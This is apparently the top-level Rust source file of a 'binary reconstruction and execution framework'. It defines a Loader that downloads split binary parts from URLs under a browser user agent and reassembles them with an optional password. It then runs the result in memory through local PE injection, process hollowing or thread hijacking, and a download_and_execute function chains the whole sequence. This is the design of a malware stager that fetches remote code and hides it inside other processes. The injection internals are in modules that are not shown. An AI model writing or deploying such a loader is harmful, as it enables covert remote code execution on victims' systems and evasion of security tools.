//! Binary reconstruction and execution framework

#![allow(dead_code)]

pub use mainlib;

pub mod download;
pub mod reconstruct;

#[cfg(any(feature = "execution-local-pe", feature = "execution-process-hollowing", feature = "execution-thread-hijack"))]
pub mod execution;

pub mod validation;

pub mod prelude {
    pub use crate::download;
    pub use crate::reconstruct;

    #[cfg(any(feature = "execution-local-pe", feature = "execution-process-hollowing", feature = "execution-thread-hijack"))]
    pub use crate::execution;

    pub use crate::validation;
    pub use crate::{Loader, LoaderConfig, LoaderResult};
    pub use anyhow::Result;
}

use anyhow::Result;
use std::collections::HashMap;

#[derive(Debug, Clone)]
pub struct LoaderConfig {
    pub urls: Vec<String>,
    pub timeout: u64,
    pub user_agent: String,
    pub validate_checksums: bool,
    pub verbose: bool,
    pub password: Option<String>,
}

impl Default for LoaderConfig {
    fn default() -> Self {
        Self {
            urls: Vec::new(),
            timeout: 30,
            user_agent: "Mozilla/5.0".to_string(),
            validate_checksums: true,
            verbose: false,
            password: None,
        }
    }
}

#[derive(Debug)]
pub struct LoaderResult {
    pub parts_downloaded: usize,
    pub binary_size: usize,
    pub execution_success: bool,
}

pub struct Loader {
    config: LoaderConfig,
}

impl Loader {
    pub fn new(config: LoaderConfig) -> Self {
        Self { config }
    }

    #[cfg(feature = "download-http")]
    pub fn download_parts(&self) -> Result<HashMap<u32, (mainlib::PartHeader, Vec<u8>)>> {
        download::http::download_all_as_map(
            &self.config.urls,
            self.config.timeout,
            &self.config.user_agent,
            self.config.verbose,
        )
    }

    pub fn reconstruct_binary(
        &self,
        parts: HashMap<u32, (mainlib::PartHeader, Vec<u8>)>,
    ) -> Result<Vec<u8>> {
        reconstruct::rebuild_from_parts(
            parts,
            self.config.password.as_deref(),
            self.config.validate_checksums,
            self.config.verbose,
        )
    }

    #[cfg(feature = "execution-local-pe")]
    pub fn execute_binary(&self, binary: &[u8]) -> Result<()> {
        execution::local_pe::inject_and_execute(binary, &[], self.config.verbose)
    }

    #[cfg(feature = "execution-process-hollowing")]
    pub fn execute_binary_with_hollowing(&self, binary: &[u8], target_path: &str) -> Result<()> {
        execution::execute_with_process_hollowing(binary, target_path, self.config.verbose)
    }

    #[cfg(all(feature = "download-http", feature = "execution-local-pe"))]
    pub fn download_and_execute(&self) -> Result<LoaderResult> {
        let parts = self.download_parts()?;
        let parts_downloaded = parts.len();

        let binary = self.reconstruct_binary(parts)?;
        let binary_size = binary.len();

        self.execute_binary(&binary)?;

        Ok(LoaderResult {
            parts_downloaded,
            binary_size,
            execution_success: true,
        })
    }

    #[cfg(feature = "download-http")]
    pub fn download_and_reconstruct(&self) -> Result<Vec<u8>> {
        let parts = self.download_parts()?;
        self.reconstruct_binary(parts)
    }
}

pub const VERSION: &str = env!("CARGO_PKG_VERSION");
pub const LIB_NAME: &str = env!("CARGO_PKG_NAME");
